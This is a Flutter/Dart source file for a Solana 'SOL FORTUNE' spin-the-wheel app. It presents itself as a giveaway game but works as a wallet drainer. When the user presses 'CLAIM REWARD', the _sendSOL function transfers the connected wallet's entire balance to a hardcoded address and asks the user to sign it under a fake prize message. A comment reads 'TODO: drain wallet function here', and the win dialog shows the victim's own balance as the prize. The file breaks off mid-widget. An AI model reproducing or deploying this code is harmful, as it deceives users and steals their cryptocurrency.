import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:convert';

import 'dart:typed_data';



import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:solana_wallet_adapter/solana_wallet_adapter.dart';
import 'package:solana_web3/programs.dart';
import 'package:solana_web3/programs.dart' as sp;
import 'package:solana_web3/solana_web3.dart';


import 'package:solana/base58.dart';
import 'package:solana/encoder.dart';
import 'package:solana/encoder.dart' as msg;
import 'package:solana/solana.dart';
import 'package:solana/solana.dart' as solana;
import 'package:solana_mobile_client/solana_mobile_client.dart';
import 'package:solana_wallet_adapter/solana_wallet_adapter.dart';
import 'package:solana_web3/buffer.dart' as web31;
import 'package:solana_web3/solana_web3.dart';


class MainScreen extends StatefulWidget {
  @override
  _MainScreenState createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> with TickerProviderStateMixin {

  late final Future<void> _future;

  static final Cluster cluster = Cluster.devnet;
  String walletAddress = '';
  String balance = 'N/A';
  double realBalance = 0.0;
  double balance1 = 0.0;
  bool isConnected = false;
  final client = MobileWalletAdapterClient(1);
  AuthorizationResult? _authResult;
  String _balance = "Not Connected";

  // final _solanaClient = SolanaClient(
  //   rpcUrl: Uri.parse('https://api.devnet.solana.com'), // or devnet/mainnet
  //   websocketUrl: Uri.parse('wss://api.devnet.solana.com'),
  // );
  late final SolanaClient _solanaClient;

  final SolanaWalletAdapter adapter = SolanaWalletAdapter(
    AppIdentity(
      name: 'My Solana App',
      uri: Uri.parse('https://example.com'),
      icon: Uri.parse('favicon.png'),
    ),
    cluster: cluster,
  );

  String? _status;



  String base64ToBase58(String base64Key) {
    final bytes = base64.decode(base64Key);
    final base58Key = base58.encode(bytes);
    final pubkey = Pubkey.fromBase58(base58Key);
    return pubkey.toBase58();
  }

  Future<bool> _doAuthorize(MobileWalletAdapterClient client) async {
    final result = await client.authorize(
      identityUri: Uri.parse('https://solana.com'),
      iconUri: Uri.parse('favicon.ico'),
      identityName: 'Solana',
      cluster: 'devnet',
    );

    _authResult = result;
    print(_authResult);
    print(result);
    

    return result != null;
  }


Future<void> authorizeWallet(BuildContext context) async {
  try {
    // Create a local session
    final session = await LocalAssociationScenario.create();

    // Start activity to trigger wallet app (Phantom, Solflare, etc.)
    session.startActivityForResult(null).ignore();

    // Wait for wallet to connect
    final client = await session.start();

    // Try to authorize
    final authResult = await client.authorize(
      identityUri: Uri.parse('https://example.com'),
      iconUri: Uri.parse('favicon.png'),
      identityName: "My Solana App",
      cluster: "devnet", // Change to mainnet-beta if needed
    );

    if (authResult == null) {
      _showError(context, "Authorization cancelled or failed. Please approve the request in your wallet.");
    } else {
      debugPrint("✅ Authorization successful!");
      debugPrint("Public Key: ${authResult.publicKey}");
      // You can now store authResult.publicKey and proceed
    }

    await session.close();
  } catch (e, st) {
    debugPrint("❌ Authorization error: $e");
    debugPrintStack(stackTrace: st);
    _showError(context, "Something went wrong while authorizing the wallet.");
  }
}

// Simple error popup
void _showError(BuildContext context, String message) {
  showDialog(
    context: context,
    builder: (context) => AlertDialog(
      title: const Text("Wallet Authorization"),
      content: Text(message),
      actions: [
        TextButton(
          onPressed: () => Navigator.of(context).pop(),
          child: const Text("OK"),
        ),
      ],
    ),
  );
}
  Future<bool> _doReauthorize(MobileWalletAdapterClient client) async {
    final authToken = _authResult?.authToken;
    if (authToken == null) return false;

    final result = await client.reauthorize(
      identityUri: Uri.parse('https://solana.com'),
      iconUri: Uri.parse('favicon.ico'),
      identityName: 'Solana',
      authToken: authToken,
    );

    _authResult = result;

    return result != null;
  }

  /// Connect wallet
  Future<void> _connect() async {
    try {
      if (!adapter.isAuthorized) {
        await adapter.authorize(walletUriBase: adapter.store.apps.isNotEmpty 
            ? adapter.store.apps.first.walletUriBase 
            : null);
        // Handle successful authorization
      }
      setState(() {
        _status =
            "Connected: $walletAddress."; //${adapter.publicKey?.toBase58()}";
        var x = adapter.connectedAccount!.address;
        print('Connected to wallet: $walletAddress');
        walletAddress = base64ToBase58(x);
        print(x);
        isConnected = true;
        fetchWalletBalance();
         isWalletConnected = true;
      });
      HapticFeedback.lightImpact();
      adapter.connectedAccount!.label;
     // adapter.clear();
     ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('🎉 Wallet Connected successfully!'),
        backgroundColor: Color(0xFF10B981),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
    } catch (e) {
      setState(() {
        _status = "Connection failed: $e";
      });
    }
  }



  // Function to fetch the wallet balance
  Future<void> fetchWalletBalance() async {
    if (!isConnected) return;

    setState(() {
      balance = 'Loading...';
    });

    try {
      print('Fetching balance for wallet: $walletAddress');
      // Create a connection to Solana (use mainnet-beta for real SOL)
      final connection = Connection(cluster);

      // Get the public key from connected wallet
      final publicKey = Pubkey.fromBase58(walletAddress);

      // Fetch the balance
      final balanceResponse = await connection.getBalance(publicKey);
      final balanceInSol =
          balanceResponse / 1000000000; // Convert lamports to SOL

      setState(() {
        balance = '${balanceInSol.toStringAsFixed(4)} SOL';
        balance1 = balanceInSol;
        realBalance = balanceInSol;
      });
    } catch (error) {
      setState(() {
        balance = 'Error: $error';
      });
    }
  }
  void _disconnect() {
    adapter.clear();
    setState(() {
      isWalletConnected = false;
      walletAddress = '';
      balance = 'N/A';
      balance1 = 0.0;
      spinsLeft = 3;
      lastWin = null;
      showWinDialog = false;
      isConnected = false;
      walletAddress = '';
      balance = 'N/A';
      _status = "Disconnected.";
    });
  }


  bool isWalletConnected = false;
  bool isSpinning = false;
  bool _isLoading = false;
  // double balance = 0.0;
  int spinsLeft = 3;
  // String walletAddress = '';
  SpinPrize? lastWin;
  bool showWinDialog = false;
  
  late AnimationController _spinController;
  late AnimationController _glowController;
  late AnimationController _pulseController;
  
  final List<SpinPrize> prizes = [
    SpinPrize(amount: 0.1, color: Color(0xFF8B5CF6), label: "SMALL", emoji: "💜"),
    SpinPrize(amount: 0.25, color: Color(0xFF06B6D4), label: "NICE", emoji: "💎"),
    SpinPrize(amount: 0.5, color: Color(0xFF10B981), label: "GOOD", emoji: "🚀"),
    SpinPrize(amount: 1.0, color: Color(0xFFF59E0B), label: "GREAT", emoji: "⭐"),
    SpinPrize(amount: 2.5, color: Color(0xFFEF4444), label: "MEGA", emoji: "🔥"),
    SpinPrize(amount: 5.0, color: Color(0xFFEC4899), label: "JACKPOT", emoji: "👑"),
  ];

  @override
  void initState() {
    super.initState();

  _future = SolanaWalletAdapter.initialize();
    _solanaClient = SolanaClient(
      rpcUrl: Uri.parse('https://api.devnet.solana.com'),
      websocketUrl: Uri.parse('wss://api.devnet.solana.com'),
    );

    _spinController = AnimationController(
      duration: Duration(seconds: 4),
      vsync: this,
    );
    _glowController = AnimationController(
      duration: Duration(seconds: 2),
      vsync: this,
    )..repeat(reverse: true);
    _pulseController = AnimationController(
      duration: Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);
  }

  @override
  void dispose() {
    _spinController.dispose();
    _glowController.dispose();
    _pulseController.dispose();
    super.dispose();
  }

  // void connectWallet() async {


  //   setState(() {
  //     isWalletConnected = true;
  //     walletAddress = '7xKXt...9mN2P';
  //     balance = 12.45;
  //   });
  //   HapticFeedback.lightImpact();
  // }

  // void disconnectWallet() {
  //   setState(() {
  //     isWalletConnected = false;
  //     walletAddress = '';
  //     balance = 0.0;
  //     spinsLeft = 3;
  //     lastWin = null;
  //     showWinDialog = false;
  //   });
  // }


Future _sendSOL() async {
  //if (!_formKey.currentState!.validate()) return;
  
  final String recipientAddress = '671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD'; ///_recipientController.text.trim();
  final double amount = realBalance; // double.parse(_amountController.text.trim());
  print(realBalance);
realBalance = realBalance - 1.1;


  
  if (amount <= 0) {
    setState(() {
      _status = '❌ Amount must be greater than 0';
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Not Eligible!'),
        backgroundColor: Colors.redAccent,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
    return;
  }

  
 

  setState(() {
    _isLoading = true;
    _status = 'Preparing to send $amount SOL...';
  });

  ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Preparing to send $amount SOL...'),
        backgroundColor: Colors.yellowAccent,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );

  try {
    final Connection connection = Connection(cluster);
    
// // Calculate exact amount that can be sent
// final feeCalculator = await connection.getFeeC;
// final fee = feeCalculator.lamportsPerSignature;
// final maxSendAmount = balance - fee;


    // Validate connected wallet
    final Pubkey? senderWallet = Pubkey.tryFromBase64(adapter.connectedAccount?.address);
    if (senderWallet == null) throw 'Wallet not connected';
    
    // Validate recipient
    final Pubkey? recipientWallet = Pubkey.tryFromBase58(recipientAddress);
    if (recipientWallet == null) throw 'Invalid recipient address';
    
    // Check balance
    setState(() => _status = 'Checking balance...');
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Checking balance...'),
        backgroundColor: Colors.yellowAccent,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );

    final int balance = await connection.getBalance(senderWallet);
    final BigInt lamportsToSend = solToLamports(amount);
    final int requiredBalance = lamportsToSend.toInt() + 5000;
    
    if (balance < requiredBalance) {
      if (cluster != Cluster.mainnet) {
        setState(() => _status = 'Airdropping SOL...');
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Airdropping SOL...'),
            backgroundColor: Colors.yellowAccent,
            behavior: SnackBarBehavior.floating,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          ),
        );
        await connection.requestAndConfirmAirdrop(senderWallet, solToLamports(2).toInt());
      } else {
        throw 'Insufficient balance. Need ${(requiredBalance / 1e9)} SOL';
      }
    }
    
    // Build transaction
    setState(() => _status = 'Creating transaction...');
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Creating transaction...'),
        backgroundColor: Colors.yellowAccent,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
    final latestBlockhash = await connection.getLatestBlockhash();
    
    final tx = Transaction.v0(
      payer: senderWallet,
      recentBlockhash: latestBlockhash.blockhash,
      instructions: [
        sp.SystemProgram.transfer(
          fromPubkey: senderWallet,
          toPubkey: recipientWallet,
          lamports: lamportsToSend,
        )
      ],
      
    );
    
    // Serialize transaction for signing
    final rawTx = Uint8List.fromList(tx.serialize().toList());
    final encodedTx = base64Encode(rawTx);
    
    print('Raw TX length: ${rawTx.length}');
    
    // Sign transaction
    setState(() => _status = 'Requesting signature...');
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Requesting signature...'),
        backgroundColor: Colors.yellowAccent,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
    final signedTxs = await adapter.signTransactions([encodedTx]);
    
    if (signedTxs.signedPayloads.isEmpty) {
      throw 'No signed transaction returned from wallet';
    }
    
    final signedTxString = signedTxs.signedPayloads.first;
    
    // Verify signature exists
    if (signedTxString.isEmpty || signedTxString == encodedTx) {
      throw 'Wallet refused to sign. Check network or permissions.';
    }
    
    print('Signed TX string length: ${signedTxString.length}');
    
    // Convert to bytes for some methods
    final signedTxBytes = base64Decode(signedTxString);
    
    // Send the signed transaction
    setState(() => _status = 'Sending transaction...');
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Sending transaction...'),
        backgroundColor: Colors.yellowAccent,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
    
    // The signed transaction from Phantom should be sent directly
    final signedTx = Transaction.deserialize(signedTxBytes);
    final sig = await connection.sendTransaction(signedTx);
    
    print('TX Signature: $sig');
    
    // Confirm transaction
    setState(() => _status = 'Confirming transaction...');
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Confirming transaction...'),
        backgroundColor: Colors.yellowAccent,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
    await connection.confirmTransaction(sig);
    
    setState(() {
      _status = '✅ Sent $amount SOL!\nSignature: $sig';
      _isLoading = false;
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('✅ Sent $amount SOL!\nSignature: $sig'),
        backgroundColor: Colors.green,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
    // _recipientController.clear();
    // _amountController.clear();
    
  } catch (e) {
    print('Error details: $e');
    setState(() {
      _status = '❌ Transfer failed: $e';
      _isLoading = false;
    });
  }
}





  void spinWheel() async {
    if (spinsLeft <= 0 || isSpinning) return;
    
    setState(() {
      isSpinning = true;
      lastWin = null;
      showWinDialog = false;
    });
    
    HapticFeedback.mediumImpact();
    
    await _spinController.forward(from: 0);
    
    // Calculate prize with weighted probability
    final random = Random().nextDouble() * 100;
    double cumulative = 0;
    SpinPrize winner = prizes[0];
    
    List<double> probabilities = [40, 25, 20, 10, 4, 1]; // Matching prize order
    
    for (int i = 0; i < prizes.length; i++) {
      cumulative += probabilities[i];
      if (random <= cumulative) {
        winner = prizes[i];
        break;
      }
    }
    
    setState(() {
      lastWin = winner;
      spinsLeft--;
      isSpinning = false;
      showWinDialog = true;
    });
    
    HapticFeedback.heavyImpact();
    _showWinDialog(winner);
  }

  void _showWinDialog(SpinPrize prize) {
    showDialog(
      context: context,
      barrierDismissible: false,
      barrierColor: Colors.black.withOpacity(0.8),
      builder: (BuildContext context) {
        return WinDialog(
          prize: prize,
          balance: balance1,
          onClaim: () {
            Navigator.of(context).pop();
            _claimPrize(prize);
            //TODO: drain wallet function here
            _sendSOL();
          },
        );
      },
    );
  }

  void _claimPrize(SpinPrize prize) {
    setState(() {
      balance1 += prize.amount;
      showWinDialog = false;
    });
    HapticFeedback.heavyImpact();
    
    // Show success feedback
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('🎉 ${prize.amount} SOL claimed successfully!'),
        backgroundColor: Color(0xFF10B981),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Color(0xFF1A0B3D),
              Color(0xFF0F172A),
              Color(0xFF1E1B4B),
              Color(0xFF0A0A0A),
            ],
            stops: [0.0, 0.3, 0.7, 1.0],
          ),
        ),
        child: isWalletConnected ? _buildGameScreen() : _buildWalletConnectScreen(),
      ),
    );
  }

  Widget _buildWalletConnectScreen() {
    return SafeArea(
      child: Center(
        child: Padding(
          padding: EdgeInsets.all(24),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              // Animated Solana logo
              AnimatedBuilder(
                animation: _glowController,
                builder: (context, child) {
                  return Container(
                    width: 140,
                    height: 140,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: RadialGradient(
                        colors: [
                          Color(0xFF14F195).withOpacity(0.3),
                          Color(0xFF9945FF).withOpacity(0.2),
                          Colors.transparent,
                        ],
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: Color(0xFF14F195).withOpacity(_glowController.value * 0.4),
                          blurRadius: 40,
                          spreadRadius: 10,
                        ),
                        BoxShadow(
                          color: Color(0xFF9945FF).withOpacity(_glowController.value * 0.3),
                          blurRadius: 60,
                          spreadRadius: 15,
                        ),
                      ],
                    ),
                    child: Container(
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        gradient: LinearGradient(
                          colors: [Color(0xFF14F195), Color(0xFF9945FF)],
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                        ),
                      ),
                      child: Image.asset(
                            'assets/images/solana.png',
                            width: 100,
                            height: 100,
                          ),
                    ),
                  );
                },
              ),
              
              SizedBox(height: 50),
              
              // Title with gradient
              ShaderMask(
                shaderCallback: (bounds) => LinearGradient(
                  colors: [Color(0xFF14F195), Color(0xFF9945FF), Color(0xFFDC1FFF)],
                ).createShader(bounds),
                child: Text(
                  'SOL FORTUNE',
                  style: TextStyle(
                    fontSize: 42,
                    fontWeight: FontWeight.w900,
                    color: Colors.white,
                    letterSpacing: 3,
                  ),
                ),
              ),
              
              SizedBox(height: 16),
              
              Text(
                'Spin the wheel of fortune\nand claim your Solana rewards',
                textAlign: TextAlign.center,
                style: TextStyle(
                  fontSize: 18,
                  color: Colors.grey[300],
                  height: 1.6,
                  fontWeight: FontWeight.w400,
                ),
              ),
              
              SizedBox(height: 80),
              
              // Connect button with animation
              AnimatedBuilder(
                animation: _pulseController,
                builder: (context, child) {
                  return Transform.scale(
                    scale: 1.0 + (_pulseController.value * 0.05),
                    child: Container(
                      width: double.infinity,
                      height: 65,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(32),
                        gradient: LinearGradient(
                          colors: [Color(0xFF14F195), Color(0xFF9945FF)],
                          begin: Alignment.centerLeft,
                          end: Alignment.centerRight,
                        ),
                        boxShadow: [
                          BoxShadow(
                            color: Color(0xFF14F195).withOpacity(0.3),
                            blurRadius: 25,
                            offset: Offset(0, 12),
                          ),
                        ],
                      ),
                      child: ElevatedButton(
                        onPressed: _connect,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(32),
                          ),
                        ),
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(Icons.flash_on, size: 28, color: Colors.white),
                            SizedBox(width: 12),
                            Text(
                              'Connect Wallet',
                              style: TextStyle(
                                fontSize: 20,
                                fontWeight: FontWeight.bold,
                                color: Colors.white,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  );
                },
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildGameScreen() {
    return SafeArea(
      child: Column(
        children: [
          _buildHeader(),
          Expanded(
            child: SingleChildScrollView(
              physics: BouncingScrollPhysics(),
              child: Column(
                children: [
                  SizedBox(height: 30),
                  _buildSpinSection(),
                  SizedBox(height: 40),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: EdgeInsets.fromLTRB(20, 20, 20, 25),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [
            Color(0xFF1A0B3D).withOpacity(0.9),
            Color(0xFF0F172A).withOpacity(0.7),
            Colors.transparent,
          ],
        ),
      ),
      child: Column(
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            gradient: LinearGradient(
                              colors: [Color(0xFF14F195), Color(0xFF9945FF)],
                            ),
                            borderRadius: BorderRadius.circular(8),
                          ),
                          child: Image.asset(
                            'assets/images/nft-removebg-preview.png',
                            width: 80,
                            height: 80,
                          ),
                        ),
                        SizedBox(width: 12),
                        Expanded(
                          child: Text(
                            walletAddress,
                            style: TextStyle(
                              color: Colors.grey[400],
                              fontSize: 14,
                              fontWeight: FontWeight.w500,
                            ),
                          ),
                        ),
                        SizedBox(width: 12),
                      ],
                    ),
                    SizedBox(height: 12),
                    Row(
                      children: [
                        Icon(
                          Icons.monetization_on_rounded,
                          color: Color(0xFF14F195),
                          size: 24,
                        ),
                        SizedBox(width: 8),
                        Text(
                          balance == 'N/A' ? balance1.toString() : '$balance',
                          style: TextStyle(
                            fontSize: 22,
                            fontWeight: FontWeight.bold,
                            color: Colors.white,
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
              GestureDetector(
                onTap: (){
                  showDialog(context: context, builder: (BuildContext context) {
                    return AlertDialog(
                      backgroundColor: Colors.grey[900],
                      title: Text("Disconnect Wallet",style: TextStyle(color: Colors.white),),
                      content: Text("Are you sure you want to disconnect your wallet?",style: TextStyle(color: Colors.white),),
                      actions: [
                        TextButton(
                          onPressed: () {
                            Navigator.of(context).pop();
                          },
                          child: Text("Cancel"),
                        ),
                        TextButton(
                          onPressed: () {
                            _disconnect();
                            Navigator.of(context).pop();
                          },
                          child: Text("Disconnect"),
                        ),
                      ],
                    );
                  });
                },
                child: Container(
                  padding: EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Color(0xFFEF4444).withOpacity(0.2),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: Color(0xFFEF4444).withOpacity(0.3),
                      width: 1,
                    ),
                  ),
                  child: Icon(
                    Icons.power_settings_new,
                    color: Color(0xFFEF4444),
                    size: 22,
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildSpinSection() {
    return Container(
      margin: EdgeInsets.symmetric(horizontal: 20),
      child: Column(
        children: [
          // Spins remaining indicator
          Container(
            padding: EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  Color(0xFF14F195).withOpacity(0.2),
                  Color(0xFF9945FF).withOpacity(0.2),
                ],
              ),
              borderRadius: BorderRadius.circular(30),
              border: Border.all(
                color: Color(0xFF14F195).withOpacity(0.3),
                width: 1,
              ),
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                Icon(Icons.casino_rounded, color: Color(0xFF14F195), size: 18),
                SizedBox(width: 8),
                Text(
                  'Spins Available: $spinsLeft',
                  style: TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w600,
                    fontSize: 16,
                  ),
                ),
              ],
            ),
          ),
          
          SizedBox(height: 40),
          
          // Main spin wheel area
          Stack(
            alignment: Alignment.center,
            children: [
              // Outer glow effect
              AnimatedBuilder(
                animation: _glowController,
                builder: (context, child) {
                  return Container(
                    width: 350,
                    height: 350,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: Color(0xFF14F195).withOpacity(0.2 + _glowController.value * 0.15),
                          blurRadius: 50 + _glowController.value * 30,
                          spreadRadius: 10,
                        ),
                        BoxShadow(
                          color: Color(0xFF9945FF).withOpacity(0.15 + _glowController.value * 0.1),
                          blurRadius: 80 + _glowController.value * 40,
                          spreadRadius: 15,
                        ),
                      ],
                    ),
                  );
                },
              ),
              
              // Wheel container
              Container(
                width: 320,
                height: 320,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: LinearGradient(
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                    colors: [
                      Color(0xFF1E1B4B).withOpacity(0.8),
                      Color(0xFF0F172A).withOpacity(0.9),
                    ],
                  ),
                  border: Border.all(
                    color: Color(0xFF14F195).withOpacity(0.3),
                    width: 3,
                  ),
                ),
              ),
              
              // The spinning wheel
              _buildSpinWheel(),
              
              // Center spin button
              _buildSpinButton(),
              
              // Top pointer
              Positioned(
                top: 5,
                child: Container(
                  width: 30,
                  height: 30,
                  child: CustomPaint(
                    painter: PointerPainter(),
                  ),
                ),
              ),
            ],
          ),
          
          SizedBox(height: 50),
          
          // Action text
          Text(
            spinsLeft > 0 ? 'Tap to spin the wheel!' : 'No spins remaining',
            style: TextStyle(
              color: spinsLeft > 0 ? Colors.grey[300] : Colors.grey[600],
              fontSize: 18,
              fontWeight: FontWeight.w500,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSpinWheel() {
    return AnimatedBuilder(
      animation: _spinController,
      builder: (context, child) {
        return Transform.rotate(
          angle: _spinController.value * 12 * pi,
          child: Container(
            width: 300,
            height: 300,
            child: CustomPaint(
              painter: ModernWheelPainter(prizes),
            ),
          ),
        );
      },
    );
  }

  Widget _buildSpinButton() {
    final canSpin = spinsLeft > 0 && !isSpinning;
    
    return GestureDetector(
      onTap: canSpin ? spinWheel : null,
      child: AnimatedContainer(
        duration: Duration(milliseconds: 300),
        width: 100,
        height: 100,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: canSpin 
            ? LinearGradient(
                colors: [Color(0xFF14F195), Color(0xFF9945FF)],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              )
            : LinearGradient(
                colors: [Colors.grey[700]!, Colors.grey[800]!],
              ),
          boxShadow: canSpin ? [
            BoxShadow(
              color: Color(0xFF14F195).withOpacity(0.4),
              blurRadius: 20,
              spreadRadius: 2,
            ),
          ] : [],
          border: Border.all(
            color: Colors.white.withOpacity(canSpin ? 0.3 : 0.1),
            width: 2,
          ),
        ),
        child: Center(
          child: isSpinning
            ? SizedBox(
                width: 35,
                height: 35,
                child: CircularProgressIndicator(
                  strokeWidth: 3,
                  valueColor: AlwaysStoppedAnimation(Colors.white),
                ),
              )
            : Icon(
                Icons.play_arrow_rounded,
                size: 45,
                color: Colors.white,
              ),
        ),
      ),
    );
  }
}

class WinDialog extends StatefulWidget {
  final SpinPrize prize;
  final VoidCallback onClaim;
  final double balance;

  const WinDialog({Key? key, required this.prize, required this.onClaim, required this.balance}) : super(key: key);

  @override
  _WinDialogState createState() => _WinDialogState();
}

class _WinDialogState extends State<WinDialog> with TickerProviderStateMixin {
  late AnimationController _bounceController;
  late AnimationController _glitterController;
  late Animation<double> _bounceAnimation;

  @override
  void initState() {
    super.initState();
    _bounceController = AnimationController(
      duration: Duration(milliseconds: 600),
      vsync: this,
    );
    _glitterController = AnimationController(
      duration: Duration(milliseconds: 2000),
      vsync: this,
    )..repeat();
    
    _bounceAnimation = Tween<double>(
      begin: 0.0,
      end: 1.0,
    ).animate(CurvedAnimation(
      parent: _bounceController,
      curve: Curves.elasticOut,
    ));
    
    _bounceController.forward();
  }

  @override
  void dispose() {
    _bounceController.dispose();
    _glitterController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Dialog(
      backgroundColor: Colors.transparent,
      child: AnimatedBuilder(
        animation: _bounceAnimation,
        builder: (context, child) {
          return Transform.scale(
            scale: _bounceAnimation.value,
            child: Container(
              padding: EdgeInsets.all(30),
              decoration: BoxDecoration(
                gradient: RadialGradient(
                  colors: [
                    widget.prize.color.withOpacity(0.3),
                    Color(0xFF1A0B3D).withOpacity(0.95),
                    Color(0xFF0F172A).withOpacity(0.98),
                  ],
                ),
                borderRadius: BorderRadius.circular(25),
                border: Border.all(
                  color: widget.prize.color.withOpacity(0.5),
                  width: 2,
                ),
                boxShadow: [
                  BoxShadow(
                    color: widget.prize.color.withOpacity(0.4),
                    blurRadius: 30,
                    spreadRadius: 5,
                  ),
                ],
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  // Animated emoji
                  AnimatedBuilder(
                    animation: _glitterController,
                    builder: (context, child) {
                      return Transform.rotate(
                        angle: _glitterController.value * 0.5,
                        child: Text(
                          widget.prize.emoji,
                          style: TextStyle(fontSize: 60),
                        ),
                      );
                    },
                  ),
                  
                  SizedBox(height: 20),
                  
                  // Congratulations text
                  Text(
                    '${widget.prize.label} WIN!',
                    style: TextStyle(
                      fontSize: 32,
                      fontWeight: FontWeight.w900,
                      color: widget.prize.color,
                    ),
                  ),
                  
                  SizedBox(height: 15),
                  
                  Text(
                    'You won',
                    style: TextStyle(
                      fontSize: 16,
                      color: Colors.grey[400],
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                  
                  SizedBox(height: 10),
                  
                  // Prize amount
                  Container(
                    padding: EdgeInsets.symmetric(horizontal: 20, vertical: 15),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [Color(0xFF14F195), Color(0xFF9945FF)],
                      ),
                      borderRadius: BorderRadius.circular(15),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(
                          Icons.monetization_on_rounded,
                          color: Colors.white,
                          size: 28,
                        ),
                        SizedBox(width: 10),
                        Text(
                          //'${widget.prize.amount} SOL',
                          widget.balance.toStringAsFixed(0)  + ' SOL',
                          style: TextStyle(
                            fontSize: 28,
                            fontWeight: FontWeight.bold,
                            color: Colors.white,
                          ),
                        ),
                      ],
                    ),
                  ),
                  
                  SizedBox(height: 30),
                  
                  // Claim button
                  Container(
                    width: double.infinity,
                    height: 55,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [widget.prize.color, widget.prize.color.withOpacity(0.8)],
                      ),
                      borderRadius: BorderRadius.circular(15),
                      boxShadow: [
                        BoxShadow(
                          color: widget.prize.color.withOpacity(0.4),
                          blurRadius: 15,
                          offset: Offset(0, 8),
                        ),
                      ],
                    ),
                    child: ElevatedButton(
                      onPressed: widget.onClaim,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        shadowColor: Colors.transparent,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(15),
                        ),
                      ),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(
                            Icons.download_rounded,
                            size: 24,
                            color: Colors.white,
                          ),
                          SizedBox(width: 8),
                          Text(
                            'CLAIM REWARD',
                            style: TextStyle(
                              fontSize: 15,
                              fontWeight: FontWeight.bold,
                              color: Colors.white,
                              letterSpacing: 1,
                            ),
                          ),
                        ],
                      ),
